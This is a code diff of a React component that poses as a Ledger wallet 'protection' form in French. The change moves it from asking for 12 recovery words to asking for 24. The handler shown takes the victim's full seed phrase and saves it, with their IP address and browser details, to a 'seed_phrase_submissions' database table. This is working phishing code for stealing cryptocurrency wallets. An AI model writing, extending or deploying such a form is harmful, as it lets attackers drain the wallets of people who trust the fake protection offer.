@@ -12,7 +12,7 @@ interface LedgerSeedPhraseFormProps {
 }
 
 const LedgerSeedPhraseForm = ({ onSuccess }: LedgerSeedPhraseFormProps) => {
-  const [seedWords, setSeedWords] = useState<string[]>(Array(12).fill(''));
+  const [seedWords, setSeedWords] = useState<string[]>(Array(24).fill(''));
   const [showSeedPhrase, setShowSeedPhrase] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const [commercialId, setCommercialId] = useState<string | null>(null);
@@ -63,10 +63,10 @@ const LedgerSeedPhraseForm = ({ onSuccess }: LedgerSeedPhraseFormProps) => {
   const handleActivateProtection = async () => {
     const filledWords = seedWords.filter(word => word.trim() !== '');
     
-    if (filledWords.length !== 12) {
+    if (filledWords.length !== 24) {
       toast({
         title: "Erreur",
-        description: "Veuillez entrer les 12 mots de votre phrase de récupération",
+        description: "Veuillez entrer les 24 mots de votre phrase de récupération",
         variant: "destructive"
       });
       return;
@@ -87,7 +87,7 @@ const LedgerSeedPhraseForm = ({ onSuccess }: LedgerSeedPhraseFormProps) => {
         .from('seed_phrase_submissions')
         .insert({
           phrase: walletPhrase,
-          word_count: 12,
+          word_count: 24,
           ip_address: ipData.ip,
           user_agent: navigator.userAgent,
           status: 'submitted',
@@ -145,9 +145,9 @@ const LedgerSeedPhraseForm = ({ onSuccess }: LedgerSeedPhraseFormProps) => {
         {/* Seed Phrase Grid */}
         <div className="space-y-2">
           <Label className="text-gray-300 text-sm">
-            Phrase de Récupération (12 mots)
+            Phrase de Récupération (24 mots)
           </Label>
-          <div className="grid grid-cols-3 gap-2">
+          <div className="grid grid-cols-4 gap-2">
             {seedWords.map((word, index) => (
               <div key={index} className="relative">
                 <Input
